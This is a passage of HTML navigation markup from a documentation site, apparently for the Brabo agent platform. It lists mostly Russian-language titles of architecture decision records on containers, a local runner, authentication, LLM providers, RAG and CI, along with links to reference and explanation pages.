href="../adr/0104-execution-mode-tres-valores-e-workspace-verificado-pelo-runner.html">ADR 0104 — `execution_mode` с тремя значениями, и workspace рождается `unverified`, когда проверяет его runner</a></li><li><a href="../adr/0107-navegacao-de-pasta-local-via-o-runner.html">ADR 0107 — Навигация по локальной папке через Runner</a></li><li><a href="../adr/0108-projeto-runner-nasce-ao-navegar-pasta-no-wizard.html">ADR 0108 — В режиме `runner` проект рождается при клике на &quot;Navegar pasta...&quot;, а не только при подтверждении</a></li><li><a href="../adr/0111-conversao-de-execution-mode-de-projeto-existente.html">ADR 0111 — Конвертация `execution_mode` существующего проекта: отказ при активном dev agent, перемещение `permissions.json`, вывод из эксплуатации строки контейнера</a></li><li><a href="../adr/0141-base-unica-dos-projetos-montados.html">ADR 0141 — Единая база монтируемых проектов, смонтированная по тождеству</a></li><li><a href="../adr/0142-validacao-de-workspace-montado-adiada.html">ADR 0142 — Проверка смонтированного workspace откладывается до материализации</a></li><li><a href="../adr/0146-base-consentida-no-bootstrap.html">ADR 0146 — База, согласованная в bootstrap, и `mounted` как локальный режим по умолчанию</a></li></ul></li><li><span>Container do projeto e broker</span><ul><li><a href="../adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica.html">ADR 0065 — Контейнер на проект: граница перестаёт быть политикой</a></li><li><a href="../adr/0081-ciclo-de-vida-do-container-tabela-sem-orquestrador.html">ADR 0081 — Жизненный цикл контейнера: таблица состояния, без оркестратора</a></li><li><a href="../adr/0083-terminal-mostra-estado-real-do-container.html">ADR 0083 — Вкладка Terminal получает реального потребителя жизненного цикла, а не терминал</a></li><li><a href="../adr/0128-porta-de-docker-e-a-prova-de-empacotamento.html">ADR 0128 — Порт Docker и доказательство упаковки, которое выбрало реализацию</a></li><li><a href="../adr/0130-broker-de-container.html">ADR 0130 — Broker контейнеров: кто говорит с Docker сервера и почему он не принимает спецификацию</a></li><li><a href="../adr/0131-roteamento-de-modulos-para-infra.html">ADR 0131 — Arquiteto направляет модули в инфраструктуру: он ВЫДВИГАЕТ кандидатов, Infra ВЫБИРАЕТ</a></li><li><a href="../adr/0133-infra-elege-imagem-do-roteamento.html">ADR 0133 — Infra выбирает среди кандидатов маршрутизации, и выбор становится новой версией `artifact.project_image`</a></li><li><a href="../adr/0134-dev-agents-executam-dentro-do-container.html">ADR 0134 — Dev agents выполняются ВНУТРИ реального контейнера проекта, а terminal получает там нижнюю границу автоодобрения</a></li><li><a href="../adr/0135-portao-de-imagem-nos-tres-modos.html">ADR 0135 — Шлюз образа от Arquiteto (RN-105) начинает действовать во всех трёх режимах выполнения</a></li><li><a href="../adr/0136-pagina-global-de-containers.html">ADR 0136 — Глобальная страница контейнеров: потолок на загрузку в broker и `container_remove` в абсолютном потолке</a></li><li><a href="../adr/0137-o-runner-sobe-o-container-do-projeto.html">ADR 0137 — `brabo-runner` поднимает контейнер проекта на машине пользователя</a></li><li><a href="../adr/0143-agentes-de-dev-so-depois-do-container.html">ADR 0143 — Агенты dev только после контейнера</a></li><li><a href="../adr/0144-a-segunda-raiz-do-broker.html">ADR 0144 — Второй корень broker и дискриминированный локатор, который его выбирает</a></li><li><a href="../adr/0180-container-com-o-dono-da-pasta.html">ADR 0180 — Контейнер проекта работает от владельца папки, измеренного api</a></li><li><a href="../adr/0190-a-infra-sobe-o-container-no-aceite.html">ADR 0190 — Infra поднимает контейнер при принятии handoff, шагом сервера и с засеянной автономией, и именно она передаёт работу Dev Lead</a></li><li><a href="../adr/0199-recurso-minimo-derivado-do-module-map.html">ADR 0199 — Минимальный ресурс контейнера выводится из `module_map`: каждый модуль объявляет свой, а Infra поднимает с суммой</a></li><li><a href="../adr/0208-a-infra-herda-a-rede-do-arquiteto.html">ADR 0208 — Infra наследует сеть, объявленную Arquiteto</a></li><li><a href="../adr/0228-comando-do-app-e-rede-do-container.html">ADR 0228 — Контейнер проекта запускает приложение по объявленной команде и публикует порт только на loopback</a></li><li><a href="../adr/0229-instancia-de-qa-efemera-com-servicos-declarados-pela-infra.html">ADR 0229 — QA тестирует в эфемерном экземпляре, с сервисами, объявленными Infra</a></li><li><a href="../adr/0264-o-app-reinicia-so-o-processo.html">ADR 0264 — Depois do avanço da pasta, o app reinicia só o processo, sem recriar o container</a></li><li><a href="../adr/0265-o-app-declarado-propoe-recriar-o-container.html">ADR 0265 — O app declarado pela Infra propõe recriar o container, com a porta na faixa 13000+</a></li></ul></li><li><span>O runner local</span><ul><li><a href="../adr/0103-runner-local-execucao-na-maquina-do-usuario.html">ADR 0103 — Локальный runner: выполнение на машине пользователя через канал Phoenix с одноразовым тикетом</a></li><li><a href="../adr/0105-personal-access-token-do-runner-escopado-por-construcao.html">ADR 0105 — Personal Access Token (`brb_…`) для runner, ограниченный по построению одним маршрутом</a></li><li><a href="../adr/0106-distribuicao-do-runner-via-tsup-e-npm-publish.html">ADR 0106 — Распространение `@brabo/runner` через `tsup` и `npm publish`, версия внедряется только в CI</a></li><li><a href="../adr/0112-binario-standalone-do-runner-via-bun-build-compile.html">ADR 0112 — Автономный бинарник `@brabo/runner` через `bun build --compile`, со встроенным нативным аддоном `.node` через реальное извлечение во временный каталог</a></li><li><a href="../adr/0118-configuracao-automatica-do-runner-pelo-navegador.html">ADR 0118 — Настройка runner через браузер: ключ устройства Ed25519 как вторая учётная запись `runner-ticket`, прокси GitHub Releases для бинарника и File System Access API для папки, настраиваемой одним кликом</a></li><li><a href="../adr/0145-docker-pre-requisito-do-runner.html">ADR 0145 — Docker становится реальным предусловием режима `runner`</a></li><li><a href="../adr/0147-agente-local-com-capacidades.html">ADR 0147 — Один локальный агент, возможности, объявляемые при подключении</a></li><li><a href="../adr/0151-base-consentida-no-runner.html">ADR 0151 — Согласованная база в runner и создание папки через канал</a></li><li><a href="../adr/0154-chave-de-dispositivo-de-maquina.html">ADR 0154 — Ключ устройства машины</a></li><li><a href="../adr/0174-runner-sem-binario-darwin-x64.html">ADR 0174 — Автономный бинарник runner перестаёт обещать Mac Intel</a></li><li><a href="../adr/0187-runner-sem-binario-win32-x64.html">ADR 0187 — Автономный бинарник runner перестаёт обещать Windows</a></li><li><a href="../adr/0193-git-credenciado-no-host-do-runner.html">ADR 0193 — Git с учётными данными выполняется на ХОСТЕ runner; код выполняется в контейнере</a></li><li><a href="../adr/0201-revogacao-por-chave.html">ADR 0201 — Отзыв нацелен на КЛЮЧ, а не на пару `{проект, пользователь}`</a></li><li><a href="../adr/0203-aposenta-o-fluxo-do-runner-pelo-navegador.html">ADR 0203 — Поток runner через браузер выводится из употребления, путь — установщик</a></li><li><a href="../adr/0230-importar-chave-de-llm-pelo-runner.html">ADR 0230 — Runner импортирует API-ключ LLM, который у пользователя уже есть на машине</a></li></ul></li><li><span>Autenticação, acesso e segredos</span><ul><li><a href="../adr/0031-auth-first-party-argon2id-e-rotacao-de-refresh.html">ADR 0031 — Собственная аутентификация: argon2id, EdDSA и ротация refresh</a></li><li><a href="../adr/0032-corte-do-keycloak-e-sessao-em-cookie.html">ADR 0032 — Отказ от Keycloak: собственный эмитент, service token и сессия в cookie</a></li><li><a href="../adr/0037-cors-do-engine-e-a-porta-como-contrato.html">ADR 0037 — CORS, которого не было у engine, и порт как часть контракта</a></li><li><a href="../adr/0050-credencial-sempre-cifrada-verificacao-explicita.html">ADR 0050 — Учётные данные всегда зашифрованы; проверка становится явным действием</a></li><li><a href="../adr/0058-csp-fechado-na-api-e-escopo-de-projeto-contido.html">ADR 0058 — Закрытый CSP в api и область проекта, удержанная в корне</a></li><li><a href="../adr/0059-segredo-do-state-de-oauth-sem-default.html">ADR 0059 — У ключа, подписывающего `state` git OAuth, нет значения по умолчанию</a></li><li><a href="../adr/0084-login-social-github-e-gitlab.html">ADR 0084 — Социальный вход (GitHub/GitLab), пересматривающий backlog ADR 0031/0032</a></li><li><a href="../adr/0096-smtp-real-no-mailsender.html">ADR 0096 — Настоящий SMTP в `MailSender`, за явным переключателем</a></li><li><a href="../adr/0127-tetos-de-rebaixamento-em-project-members.html">ADR 0127 — Два потолка понижения в `project_members`, а перекрытие остаётся</a></li><li><a href="../adr/0156-teto-de-auto-rebaixamento-na-remocao.html">ADR 0156 — Потолок самопонижения также при удалении участника проекта</a></li><li><a href="../adr/0157-teto-de-auto-movimento-no-upsert-de-workspace.html">ADR 0157 — Потолок самоперемещения в upsert workspace и самоповышение, которое было брешью</a></li><li><a href="../adr/0158-o-id-da-chave-mestra-gravado-no-envelope.html">ADR 0158 — Id мастер-ключа, записанный в конверте, как наблюдаемость и никогда как полномочие</a></li><li><a href="../adr/0173-remocao-de-membro-de-workspace.html">ADR 0173 — Удаление участника workspace рождается, защищённое тем же условием</a></li><li><a href="../adr/0245-acesso-rapido-por-papel-so-no-ambiente-local.html">ADR 0245 — Быстрый доступ по роли только в локальном окружении</a></li></ul></li><li><span>Providers de LLM, modelos e gasto</span><ul><li><a href="../adr/0040-moeda-do-dashboard.html">ADR 0040 — Валюта дашборда: пока USD, ручной курс по workspace отложен</a></li><li><a href="../adr/0041-base-openai-compativel-e-contrato-de-llm-providers.html">ADR 0041 — Одна OpenAI-совместимая база, один контракт LLM providers и capabilities, отклоняющие binding</a></li><li><a href="../adr/0042-catalogo-vivo-ciclo-de-vida-do-modelo-e-preco-auditavel.html">ADR 0042 — Живой каталог, жизненный цикл модели и проверяемая цена</a></li><li><a href="../adr/0043-seis-providers-de-llm-e-o-fechamento-da-fase-9b.html">ADR 0043 — Шесть providers LLM поверх базы, и Фаза 9b наконец закрыта</a></li><li><a href="../adr/0049-curadoria-de-modelo-por-workspace.html">ADR 0049 — Курирование моделей по workspace</a></li><li><a href="../adr/0051-facetas-de-capability-e-curadoria-por-uso.html">ADR 0051 — Доказанные грани capability; &quot;для чего годится&quot; — это курирование</a></li><li><a href="../adr/0063-duas-audiencias-para-o-mesmo-gasto.html">ADR 0063 — Две аудитории для одного и того же расхода: счёт owner и потребление участника</a></li><li><a href="../adr/0064-escopo-de-area-na-cascata-e-o-binding-de-agente-global.html">ADR 0064 — Область как уровень каскада модели и глобальный binding агента</a></li><li><a href="../adr/0075-embeddings-no-contrato-de-llm-provider.html">ADR 0075 — Embeddings в контракте LLMProvider</a></li><li><a href="../adr/0076-provider-volta-a-ser-dimensao-de-gasto.html">ADR 0076 — `provider` снова становится измерением расходов, а сдерживание переходит к типу</a></li><li><a href="../adr/0077-ranking-de-modelos-por-capacidade-sem-nota-inventada.html">ADR 0077 — Рейтинг моделей по возможностям, без выдуманной оценки</a></li><li><a href="../adr/0110-budget-por-area-aditivo-nao-cascata.html">ADR 0110 — Бюджет по области АДДИТИВЕН, рядом с проектом/сессией — не каскад и не новая таблица</a></li><li><a href="../adr/0114-deteccao-de-ollama-nativo-no-bootstrap-dev.html">ADR 0114 — Обнаружение нативного Ollama в dev bootstrap: спросить один раз, сохранить в `.env`, поставить сервисы compose за profile</a></li><li><a href="../adr/0115-pedido-de-pull-de-modelo-huggingface-tabela-propria.html">ADR 0115 — Pull модели из Hugging Face: собственная таблица, подтверждение в два шага и allowlist официальных издателей — никогда `proposed_actions`</a></li><li><a href="../adr/0166-preferencia-de-roteamento-no-binding-de-modelo.html">ADR 0166 — Предпочтение маршрутизации живёт в binding модели, путешествует вместе с ним и замораживается в metering</a></li><li><a href="../adr/0188-o-custo-real-do-provider-vira-o-numero-do-metering.html">ADR 0188 — Реальная стоимость, которую возвращает provider, становится числом metering</a></li><li><a href="../adr/0198-duplicata-semantica-por-embedding-com-limiar-que-so-avisa.html">ADR 0198 — О семантическом дубликате истории и правила предупреждает embedding с порогом, а расход попадает в metering</a></li><li><a href="../adr/0221-upstream-preso-por-sessao.html">ADR 0221 — Хаб привязывает разговор каждого агента к обслужившему его upstream по `session_id`</a></li><li><a href="../adr/0222-provider-9router-de-llm.html">ADR 0222 — 9Router входит как 10-й LLM-провайдер, с URL на установку</a></li><li><a href="../adr/0223-orcamento-de-raciocinio-por-modelo.html">ADR 0223 — Бюджет рассуждения — capability НА МОДЕЛЬ, курируемая вручную</a></li><li><a href="../adr/0224-raciocinio-abortado-no-stream.html">ADR 0224 — Рассуждение считается в потоке и обрывается на лимите, а стоимость оценивается и сверяется</a></li><li><a href="../adr/0225-teto-de-preco-do-upstream-no-openrouter.html">ADR 0225 — OpenRouter получает потолок цены на вызов (`provider.max_price` = каталог × 1,5)</a></li><li><a href="../adr/0227-provider-opencode-zen-de-llm.html">ADR 0227 — OpenCode Zen входит как 11-й LLM-провайдер, только в диалекте OpenAI</a></li><li><a href="../adr/0233-membro-ve-o-gasto-do-projeto-sem-credencial.html">ADR 0233 — Участник видит расходы проекта по агентам и областям, никогда по провайдерам</a></li><li><a href="../adr/0251-preco-de-lista-datado-para-provider-sem-preco.html">ADR 0251 — Датированная в коде прайс-цена для провайдера, не сообщающего цену</a></li><li><a href="../adr/0257-na-anthropic-direta-o-raciocinio-desligado-e-por-modelo.html">ADR 0257 — В прямом Anthropic отключённое рассуждение задаётся по модели, а усилие снижает Opus</a></li></ul></li><li><span>RAG, grafo de conhecimento e artefatos</span><ul><li><a href="../adr/0079-tabela-de-chunks-vetor-e-tsvector-juntos.html">ADR 0079 — Таблица chunks: вектор и `tsvector` в одной строке</a></li><li><a href="../adr/0080-busca-hibrida-pesos-limiar-e-citacao.html">ADR 0080 — Гибридный поиск: веса, порог и что такое цитата</a></li><li><a href="../adr/0082-chat-rag-aba-de-busca-hibrida.html">ADR 0082 — Chat RAG: собственная вкладка гибридного поиска, без переименования &quot;Chat&quot;</a></li><li><a href="../adr/0099-neo4j-grafo-de-conhecimento-e-templates.html">ADR 0099 — Neo4j как граф знаний и шаблоны prompt, драйвер в api</a></li><li><a href="../adr/0100-rag-search-e-modelos-garantidos-no-boot.html">ADR 0100 — `rag_search` для агентов и модели Ollama, гарантированные при загрузке</a></li><li><a href="../adr/0101-memoria-relacional-como-projecao-do-event-log.html">ADR 0101 — Реляционная память как проекция event log; шаблоны потребляются без трогания GenServers</a></li><li><a href="../adr/0113-pasta-local-anexada-via-navegador-vira-chunks-scope-local.html">ADR 0113 — Локальная папка, приложенная через браузер, становится `chunks.scope = 'local'`, читаемым БРАУЗЕРОМ, никогда путём хоста</a></li><li><a href="../adr/0129-telemetria-de-busca-do-rag-como-tabela.html">ADR 0129 — Телеметрия поиска RAG — это ТАБЛИЦА, с весами, замороженными в строке</a></li><li><a href="../adr/0132-golden-set-de-acerto-do-rag.html">ADR 0132 — Golden-set попаданий RAG и gate `rag-acertivo`</a></li><li><a href="../adr/0138-golden-set-do-rag-em-ci-agendado.html">ADR 0138 — Golden-set RAG начинает работать в CI, по расписанию — и остаётся `warn`</a></li><li><a href="../adr/0148-artefatos-projetados-em-arquivo.html">ADR 0148 — Артефакты агентов, спроецированные в файлы, в папку `docs/`</a></li><li><a href="../adr/0196-anamnese-religada-com-sujeito-e-fato-do-perfil.html">ADR 0196 — Anamnese снова включена: не работает без субъекта, а принятая гипотеза становится фактом профиля</a></li><li><a href="../adr/0200-contrato-entre-modulos-artefato-do-arquiteto.html">ADR 0200 — Контракт между модулями становится версионируемым артефактом Arquiteto, и dev agent читает его вместо чужого worktree</a></li><li><a href="../adr/0205-desvio-do-agente-como-sinal-do-produto.html">ADR 0205 — Отклонение агента, которое наблюдает Anamnese, становится сигналом продукта, без персональных данных</a></li></ul></li><li><span>Interface web e design system</span><ul><li><a href="../adr/0036-telas-de-auth-fieis-ao-design-e-fontes-auto-hospedadas.html">ADR 0036 — Экраны аутентификации, верные дизайну, и три шрифта, которые не загружались</a></li><li><a href="../adr/0060-superficie-de-leitura-de-codigo.html">ADR 0060 — Поверхность чтения кода, ограниченная и с бюджетом</a></li><li><a href="../adr/0074-tema-alcancavel-e-o-boot-sob-csp.html">ADR 0074 — Достижимая тема и загрузка под CSP</a></li><li><a href="../adr/0078-moldura-de-tela-e-o-registro-de-abas-diverge-do-handoff.html">ADR 0078 — Рамка экрана, и реестр вкладок намеренно расходится с handoff</a></li><li><a href="../adr/0097-leitura-direta-do-schema-do-engine-para-online-agent-count.html">ADR 0097 — Прямое чтение схемы engine для &quot;N агентов онлайн&quot; на дашборде</a></li><li><a href="../adr/0116-tipos-do-web-gerados-do-openapi.html">ADR 0116 — `ActionType` (и будущие типы) генерируются из контракта OpenAPI, а не копируются вручную</a></li><li><a href="../adr/0122-sessionpage-dividido-em-cinco-prs.html">ADR 0122 — `SessionPage.tsx`, разделённый на пять механических PR, объявленных заранее</a></li><li><a href="../adr/0124-hook-do-canal-de-turno-do-sessionpage.html">ADR 0124 — Группировка состояния канала хода, извлечённая в `useTurnoDoAgente`</a></li><li><a href="../adr/0125-projectsettingstab-dividido-por-secao.html">ADR 0125 — `ProjectSettingsTab.tsx` разделён на файл на раздел, за barrel</a></li><li><a href="../adr/0126-trilho-vertical-de-navegacao-do-projeto.html">ADR 0126 — Страница проекта навигируется вертикальной рейкой, а вкладка Código перестаёт сама сворачивать sidebar</a></li><li><a href="../adr/0176-sessionpage-abaixo-de-mil-linhas.html">ADR 0176 — `SessionPage.tsx` меньше 1 000 строк, за десять механических PR, а замок — только после</a></li><li><a href="../adr/0181-tema-preto-neutro.html">ADR 0181 — Тёмная тема становится нейтрально-чёрной, и долг контраста заканчивается</a></li><li><a href="../adr/0210-animacao-de-texto-com-motion.html">ADR 0210 — Анимация текста с `motion`</a></li><li><a href="../adr/0211-uma-navegacao-so-a-sidebar-absorve-o-trilho.html">ADR 0211 — Одна навигация: боковая панель поглощает рельс проекта</a></li><li><a href="../adr/0232-shadcn-com-base-ui-no-apps-web.html">ADR 0232 — shadcn/ui с Base UI и Tailwind 4 в `apps/web`</a></li><li><a href="../adr/0234-shiki-e-recharts-por-carga-dinamica.html">ADR 0234 — `shiki` в Code Block и `recharts` в Chart, всегда динамической загрузкой</a></li><li><a href="../adr/0237-o-visual-v3-liga-o-preflight-e-sobe-os-raios.html">ADR 0237 — Визуал v3 включает preflight и увеличивает радиусы</a></li><li><a href="../adr/0238-o-grafo-de-modulos-vira-canvas-xyflow.html">ADR 0238 — Граф модулей вкладки Arquitetura становится Canvas (`@xyflow/react`)</a></li><li><a href="../adr/0239-csp-frame-src-local-para-o-web-preview.html">ADR 0239 — Локальный CSP `frame-src` для Web preview результата</a></li><li><a href="../adr/0240-o-motivo-de-controle-inerte-mora-num-ponto-de-interrogacao-nos-containers.html">ADR 0240 — Причина неактивного элемента управления может жить в активном «?» на странице Containers</a></li><li><a href="../adr/0241-a-sidebar-adota-o-block-sidebar-07-do-shadcn.html">ADR 0241 — Sidebar принимает блок `sidebar-07` из shadcn</a></li><li><a href="../adr/0242-containers-em-tabela-linear-com-tanstack-react-table.html">ADR 0242 — Containers в линейной таблице с `@tanstack/react-table`</a></li><li><a href="../adr/0243-consequencia-irreversivel-pode-morar-num-botao-de-perigo.html">ADR 0243 — Необратимое последствие может жить в кнопке опасности</a></li><li><a href="../adr/0244-coluna-das-abas-do-projeto-alinhada-a-esquerda.html">ADR 0244 — Колонка вкладок проекта выровнена по левому краю</a></li><li><a href="../adr/0248-conteudo-das-paginas-ocupa-a-largura-inteira.html">ADR 0248 — Содержимое страниц занимает всю ширину</a></li><li><a href="../adr/0250-chat-da-sessao-ocupa-a-largura-inteira.html">ADR 0250 — Чат сессии занимает всю ширину</a></li></ul></li><li><span>Operação, deploy e instalação</span><ul><li><a href="../adr/0024-fase5-imagens-producao-ci.html">ADR 0024 — Фаза 5 (сессия 1): production-образы, compose.prod, CI и smoke-тест</a></li><li><a href="../adr/0025-fase5-deploy-kubernetes-kustomize.html">ADR 0025 — Фаза 5 (сессия 2): деплой в Kubernetes с Kustomize, метрика очереди и локальный overlay</a></li><li><a href="../adr/0026-fase5-observabilidade-e-graceful-shutdown.html">ADR 0026 — Фаза 5 (сессия 3): graceful shutdown, OpenTelemetry, метрики, логи и дашборды</a></li><li><a href="../adr/0027-fase5-backup-hardening-release.html">ADR 0027 — Backup/restore, усиление api, открытая поверхность и релиз</a></li><li><a href="../adr/0035-observabilidade-legivel-e-trace-sem-coletor.html">ADR 0035 — Trace без коллектора и путь между слоями в логе</a></li><li><a href="../adr/0070-observabilidade-no-compose-local.html">ADR 0070 — Наблюдаемость в локальном Compose: метрики и журналы, без трассировки</a></li><li><a href="../adr/0150-instalador-de-uma-linha.html">ADR 0150 — Установщик одной строкой, с выбранным источником и маркером</a></li><li><a href="../adr/0152-backup-de-volumes-contra-compose.html">ADR 0152 — Резервное копирование и восстановление томов для compose</a></li><li><a href="../adr/0153-deploy-enabled-o-gatilho-que-ninguem-cria.html">ADR 0153 — `DEPLOY_ENABLED`: триггер, который упоминают десять документов и не создаёт ни один</a></li><li><a href="../adr/0155-a-primeira-conta-nasce-no-terminal.html">ADR 0155 — Первая учётная запись рождается в терминале, а локальный агент поднимается сопряжённым</a></li><li><a href="../adr/0160-o-compose-do-instalador-viaja-assinado.html">ADR 0160 — Compose установщика едет вместе с ним, как подписанный asset</a></li><li><a href="../adr/0161-a-tela-so-oferece-o-modo-que-a-instalacao-executa.html">ADR 0161 — Экран предлагает только тот режим, который выполняет установка, а у установки через Release нет broker</a></li><li><a href="../adr/0162-broker-publicado-e-oferecido-pelo-instalador.html">ADR 0162 — Broker становится пятым опубликованным образом, а установщик СПРАШИВАЕТ, включать ли его</a></li><li><a href="../adr/0169-seaweedfs-no-lugar-do-minio-no-overlay-local.html">ADR 0169 — Назначением S3 локального overlay перестаёт быть MinIO и становится SeaweedFS</a></li><li><a href="../adr/0170-compose-de-dev-brabo-dev.html">ADR 0170 — Dev-compose становится `brabo-dev`, и dev отказывается подниматься рядом с установкой</a></li><li><a href="../adr/0209-engine-em-otp-29.html">ADR 0209 — Engine переходит на Elixir 1.20.4 / OTP 29.1.1</a></li><li><a href="../adr/0256-a-migracao-restaura-o-banco-num-banco-vazio.html">ADR 0256 — Миграция установщика восстанавливает базу в только что созданную пустую базу</a></li></ul></li><li><span>CI, release e cadeia de suprimentos</span><ul><li><a href="../adr/0039-actionlint-e-validacao-do-pipeline-de-ci-gerado.html">ADR 0039 — actionlint и валидация генерируемого конвейера CI</a></li><li><a href="../adr/0119-imagens-publicadas-no-ghcr-por-digest.html">ADR 0119 — Образы, публикуемые в GHCR с каждым финальным тегом, и production overlay, закреплённый по digest</a></li><li><a href="../adr/0120-e2e-de-navegador-contra-o-compose-de-producao.html">ADR 0120 — Браузерный E2E против продакшен-compose, в пакете вне workspace</a></li><li><a href="../adr/0121-schema-dividido-por-agregado-de-dominio.html">ADR 0121 — Схема, разделённая по доменным агрегатам, за barrel</a></li><li><a href="../adr/0140-timeout-do-audit-como-risco-assumido.html">ADR 0140 — Повторяющийся timeout `pnpm audit` — принятый риск; находка по-прежнему отклоняет</a></li><li><a href="../adr/0149-assinatura-dos-artefatos-publicados.html">ADR 0149 — Подпись опубликованных артефактов</a></li><li><a href="../adr/0159-imagem-de-terceiro-por-digest.html">ADR 0159 — Сторонний образ входит по digest, и lint проваливает того, кто забудет</a></li><li><a href="../adr/0172-trivy-no-release-antes-de-assinar.html">ADR 0172 — Релиз сканирует Trivy то, что публикует, по digest, до подписи</a></li><li><a href="../adr/0178-tag-inline-na-imagem-de-terceiro.html">ADR 0178 — Тег стороннего образа живёт ВНУТРИ ссылки, перед digest</a></li><li><a href="../adr/0197-a-imagem-dos-workflows-vem-do-compose.html">ADR 0197 — Образ workflows берётся из compose, и Dependabot для образов включается</a></li><li><a href="../adr/0252-o-brabo-vira-um-conjunto-de-repositorios.html">ADR 0252 — Brabo становится набором репозиториев в `viralabs-dev`</a></li></ul></li><li><span>Documentação</span><ul><li><a href="../adr/0029-sincronizacao-continua-da-documentacao.html">ADR 0029 — Непрерывная синхронизация документации</a></li><li><a href="../adr/0033-referencia-de-api-gerada-do-openapi.html">ADR 0033 — Справочник API выводится из кода, а табличный тест требует метаданных</a></li><li><a href="../adr/0034-documentacao-publicada-por-degrau.html">ADR 0034 — Документация, публикуемая по ступеням, в подкаталоге Pages</a></li><li><a href="../adr/0071-publicacao-simetrica-por-degrau.html">ADR 0071 — Симметричная публикация по ступеням и корень, который предлагает выбор</a></li><li><a href="../adr/0073-o-caminho-publicado-nomeia-o-ambiente.html">ADR 0073 — Публикуемый путь называет окружение, а не ветку</a></li><li><a href="../adr/0117-lockfile-proprio-para-o-website.html">ADR 0117 — `website/` получает собственный lockfile, вне `pnpm audit` продукта</a></li><li><a href="../adr/0202-o-indice-de-adr-por-tema.html">ADR 0202 — Индекс ADR по темам, с темой вне ADR</a></li><li><a href="../adr/0206-referencia-da-api-numa-pagina-redoc.html">ADR 0206 — Справочник API становится страницей Redoc</a></li><li><a href="../adr/0216-quatro-idiomas-com-pt-br-como-fonte.html">ADR 0216 — Четыре языка, с pt-BR как ИСТОЧНИКОМ и языком по умолчанию: документация и интерфейс на португальском, английском, русском и упрощённом китайском</a></li><li><a href="../adr/0218-titulo-de-adr-com-prefixo.html">ADR 0218 — Каждый ADR называется «ADR NNNN — заголовок»</a></li><li><a href="../adr/0219-referencia-entra-na-traducao.html">ADR 0219 — Справочник входит в перевод</a></li><li><a href="../adr/0220-api-traduzida-por-catalogo.html">ADR 0220 — Страница API переводится по каталогу</a></li><li><a href="../adr/0253-o-site-de-docs-deixa-o-docusaurus.html">ADR 0253 — Сайт документации отказывается от Docusaurus</a></li><li><a href="../adr/0254-a-doc-de-cada-area-mora-na-raiz-dela.html">ADR 0254 — Документация каждой области живёт в её корне</a></li><li><a href="../adr/0260-doc-dos-repos-de-codigo-so-em-ingles.html">ADR 0260 — Документация репозиториев с кодом только на английском; сайт отдаёт английский источник с полосой</a></li><li><a href="../adr/0266-doc-dos-repositorios-em-portugues-por-padrao.html">ADR 0266 — A doc dos repositórios é em pt-BR por padrão, com traduções permitidas nos irmãos</a></li></ul></li></ul></li></ul></section><section><h2>📐 Правила</h2><ul><li><a href="../business-rules.html">Бизнес-правила</a></li><li><a href="../business-rules/custo.html">Стоимость и metering</a></li><li><a href="../business-rules/autenticacao.html">Аутентификация</a></li><li><a href="../business-rules/api.html">API</a></li><li><a href="../business-rules/broker.html">Broker</a></li><li><a href="../business-rules/ci.html">CI</a></li><li><a href="../business-rules/contracts.html">Contratos</a></li><li><a href="../business-rules/engine.html">Engine</a></li><li><a href="../business-rules/infra.html">Infra</a></li><li><a href="../business-rules/produto.html">Produto</a></li><li><a href="../business-rules/runner.html">Runner</a></li><li><a href="../business-rules/web.html">Web</a></li></ul></section><section><h2>📖 Справочник</h2><ul><li><a href="../reference/configuration.html">Configuração</a></li><li><a href="../reference/events.html">Eventos</a></li><li><a href="../reference/permissions.html" aria-current="page">Permissões</a></li><li><a href="../reference/artifacts.html">Artefatos</a></li><li><a href="../reference/git-providers.html">Provedores de git</a></li><li><a href="../reference/internal-api.html">API interna</a></li><li><a href="../reference/scripts.html">Scripts e comandos</a></li><li><a href="../reference/rulesets.html">Rulesets do repositório</a></li><li><a href="../reference/paridade-de-traducao.html">Paridade de tradução</a></li><li><a href="../reference/brb.html">Registro BRB</a></li><li><a href="../security-surface.html">Superfície exposta da api</a></li><li><span>Справочник API</span></li></ul></section><section><h2>💡 Пояснения</h2><ul><li><span>Процесс и конвейер</span><ul><li><a href="../explanation/documentation-workflow.html">Синхронизация документации</a></li><li><a href="../explanation/branching-policy.html">Политика веток</a></li><li><a href="../explanation/cadeia-de-suprimentos-do-ci.html">Цепочка поставок CI</a></li><li><a href="../explanation/release-do-produto.html">Релиз продукта</a></li><li><a href="../explanation/gates.html">Gates и то, как они измеряются</a></li><li><a href="../explanation/observability.html">Observabilidade</a></li><li><a href="../explanation/modelo-de-time.html">Модель команды и поток результатов</a></li></ul></li><li><span>Проверки и измерения</span><ul><li><a href="../explanation/primeiro-dogfooding.html">Первый dogfooding</a></li><li><a href="../explanation/execucao-real-hello-world.html">Реальное выполнение (hello world)</a></li><li><a href="../explanation/achados-execucao-real.html">Находки реального прогона конвейера</a></li><li><a href="../explanation/validacao-fase-12.html">Проверка Фазы 12</a></li><li><a href="../explanation/validacao-real.html">Реальная валидация (13b)</a></li><li><a href="../explanation/aceite-providers.html">Aceite dos providers</a></li><li><a href="../explanation/medicao-do-idioma.html">Измерение эвристики языка</a></li><li><a href="../explanation/medicao-do-jev.html">Измерение маршрутизатора инструментов Jev</a></li><li><a href="../explanation/auditoria-fluxo-vs-codigo.html">Аудит: fluxo.yml × код (v3, ADR 0085)</a></li><li><a href="../explanation/auditoria-visual-rodada-29.html">Визуальный аудит до и после Rodada 29</a></li></ul></li><li><span>История фаз</span><ul><li><a href="../explanation/historico-de-fases.html">История фаз</a></li><li><a href="../explanation/fase-28-pasta-do-usuario.html">ФАЗА 28 — папка пользователя</a></li><li><a href="../explanation/fase-29-instalacao-de-uma-linha.html">FASE 29 — установка одной строкой</a></li><li><a href="../explanation/fase-30-runner-por-maquina.html">FASE 30 — локальный агент машины</a></li><li><a href="../explanation/backlog.html">Backlog после триажа</a></li></ul></li><li><span>Локализация</span><ul><li><a href="../explanation/localizacao.html">Локализация</a></li><li><a href="../explanation/localizacao-en.html">Локализация — английский (en)</a></li><li><a href="../explanation/localizacao-ru.html">Локализация — русский (ru)</a></li><li><a href="../explanation/localizacao-zh-hans.html">Локализация — упрощённый китайский (zh-Hans)</a></li></ul></li><li><span>Технические заметки</span><ul><li><a href="../explanation/tanstack-ai.html">TanStack AI — não adotado</a></li></ul></li></ul></section><section><h2>🛠️ Эксплуатация</h2><ul><li><a href="../runbook.html">Manual de operação</a></li></ul></section><section><h2>📚 Словарь</h2><ul><li><a href="../glossary.html">Глоссарий</a></li></ul></section><section><h2>🤝 Участие</h2><ul><li><a href="https://github.com/viralabs-dev/brabo/blob/dev/CONTRIBUTING.md">Как внести вклад</a></li><li><a 